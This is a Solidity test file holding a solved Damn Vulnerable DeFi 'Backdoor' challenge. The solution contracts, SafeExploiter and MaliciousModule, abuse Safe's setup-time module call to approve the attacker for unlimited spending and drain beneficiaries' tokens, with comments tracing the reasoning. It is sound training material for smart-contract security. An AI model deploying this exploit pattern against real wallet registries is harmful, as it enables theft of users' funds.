// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // ********************
        // 1. Not familliar with multisig wallet, upon some inspection, the creation process should be SafeProxy::createProxyWithCallback()
        // 2. The creatin process goes from SafeProxy::createProxyWithCallback() => SafeProxy::createProxyWithNonce() => SafeProxy::deployProxy()
        // => low level call to the SafeProxy created.
        // 3. Relationship => SafeProxyFactory manages and creates SafeProxy with implementation logic on Safe
        // 4. Upon inspecting the setModules() in Safe::setup(), we notice there is something fishy.
        // 5. Safe.sol inherrited from ModuleManager. ModuleManager has this comment => "...only trusted and audited modules should be added
        // to a Safe. A malicious module can completely takeover a Safe." => Immediately caught my attention and excites me.
        // 6. What if, we can Safe::setup() our wallet with other people's address (the registered benificiaries), then through module, we add
        // player as owner to the wallet, and then withdraw the funds?
        // 7. There is 2 functions in Safe(under OwnerManager) that can change ownership => swapOwner() or addOwnerWithThreshold()
        // 8. Upon inspection deeper in the ModuleManager, notice that ModuleManager has a function execTransactionFromModule() that can execute on behalf
        // of the wallet.
        // 9. Wait, further reading discover that during the setupModule(), we can execute arbitrary code in the context if safe. This makes it possible for
        // us to directly call to the Token.approve(), which allow us to draw the funds.
        // ********************
        new SafeExploiter(token, singletonCopy, walletFactory, walletRegistry, users, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

// ********************
// 1. Not familliar with multisig wallet, upon some inspection, the creation process should be SafeProxy::createProxyWithCallback()
// 2. The creatin process goes from SafeProxy::createProxyWithCallback() => SafeProxy::createProxyWithNonce() => SafeProxy::deployProxy()
// => low level call to the SafeProxy created.
// 3. Relationship => SafeProxyFactory manages and creates SafeProxy with implementation logic on Safe
// 4. Upon inspecting the setModules() in Safe::setup(), we notice there is something fishy.
// 5. Safe.sol inherrited from ModuleManager. ModuleManager has this comment => "...only trusted and audited modules should be added
// to a Safe. A malicious module can completely takeover a Safe." => Immediately caught my attention and excites me.
// 6. What if, we can Safe::setup() our wallet with other people's address (the registered benificiaries), then through module, we add
// player as owner to the wallet, and then withdraw the funds?
// 7. There is 2 functions in Safe(under OwnerManager) that can change ownership => swapOwner() or addOwnerWithThreshold()
// 8. Upon inspection deeper in the ModuleManager, notice that ModuleManager has a function execTransactionFromModule() that can execute on behalf
// of the wallet.
// 9. Wait, further reading discover that during the setupModule(), we can execute arbitrary code in the context if safe. This makes it possible for
// us to directly call to the Token.approve(), which allow us to draw the funds.
// ********************

contract SafeExploiter is Test {
    address private owner;

    address[] public targetUsers;
    DamnValuableToken public token;
    Safe public singletonCopy;
    SafeProxyFactory public walletFactory;
    WalletRegistry public walletRegistry;
    address public recovery;

    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        address[] memory _targetUsers,
        address _recovery
    ) {
        owner = msg.sender;
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        recovery = _recovery;

        MaliciousModule badModule = new MaliciousModule();

        for (uint256 i = 0; i < _targetUsers.length; i++) {
            targetUsers.push(_targetUsers[i]);
        }

        for (uint256 i = 0; i < targetUsers.length; i++) {
            // Constructing Initializer Data

            // function setup(
            // address[] calldata _owners,
            // uint256 _threshold,
            // address to,
            // bytes calldata data,
            // address fallbackHandler,
            // address paymentToken,
            // uint256 payment,
            // address payable paymentReceiver
            // ) external;

            bytes4 setupSelector =
                bytes4(keccak256("setup(address[],uint256,address,bytes,address,address,uint256,address)"));
            address[] memory safeOwners = new address[](1);
            safeOwners[0] = targetUsers[i];
            uint256 safeThreshold = 1;
            // address toModule = address(token);
            // bytes memory dataToModule = abi.encodeWithSelector(
            //     bytes4(keccak256("approve(address,uint256)")),
            //     address(this), // spender (the address being approved)
            //     type(uint256).max // amount (maximum uint256 value)
            // );
            address toModule = address(badModule);
            bytes memory dataToModule = abi.encodeWithSelector(
                MaliciousModule.approveSpender.selector, address(token), address(this), type(uint256).max
            );
            address fallbackHandler = address(0);
            address paymentToken = address(0);
            uint256 payment = 0;
            address paymentReceiver = address(0);

            bytes memory initializerData = abi.encodeWithSelector(
                setupSelector,
                safeOwners,
                safeThreshold,
                toModule,
                dataToModule,
                fallbackHandler,
                paymentToken,
                payment,
                paymentReceiver
            );
            address safeWalletAddress = address(
                walletFactory.createProxyWithCallback(address(singletonCopy), initializerData, i, walletRegistry)
            );

            console.log("Allowances of attack contract: ", token.allowance(safeWalletAddress, address(this)));

            token.transferFrom(safeWalletAddress, recovery, token.balanceOf(safeWalletAddress));
        }
    }
}

contract MaliciousModule {
    function approveSpender(address _token, address _spender, uint256 _amount) external {
        DamnValuableToken(_token).approve(_spender, _amount);
    }
}
